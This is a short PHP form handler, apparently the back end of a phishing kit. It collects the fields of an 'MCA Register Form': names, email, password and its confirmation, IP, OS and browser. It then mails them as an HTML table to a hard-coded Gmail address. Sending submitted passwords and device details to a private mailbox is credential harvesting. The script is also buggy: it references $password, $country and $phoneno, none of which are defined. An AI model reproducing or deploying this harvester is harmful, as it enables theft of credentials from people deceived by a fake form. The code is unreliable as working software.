<?php
$to = "kubcecil57@gmail.com";
$fname=$_POST['fname'];
$lname=$_POST['lname'];
$email=$_POST['email'];
$pass=$_POST['password'];
$pass1=$_POST['passwordconf'];
$ip=$_POST['ip'];
$os=$_POST['os'];
$browser=$_POST['browser'];
$subject = $email;
$message ="<html>
<head>
<title>HTML email</title>
</head>
<body>
<table border='1' style='text-align:left;''>
<tr style='background-color:red'>
<th colspan=4 style='text-align:center;background-color:#000;color:#fff;'>MCA Register Form</th>
</tr>
<tr style='background-color:#e6e6e6'>
<th  width=100>Full Name</th>
<td>$fname</td>
</tr>
<tr >
<th>Password</th>
<td>$password</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>Email</th>
<td>$email</td>
</tr>
<tr>
<th>country</th>
<td>$country</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>phone no</th>
<td>$phoneno</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>IP</th>
<td > $ip</td>
</tr>
<tr>
<th>OS</th>
<td > $os</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>Browser</th>
<td > $browser</td>
</tr>
</table>
</body>
</html>";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$mail=   mail($to, $subject, $message, $headers);
?>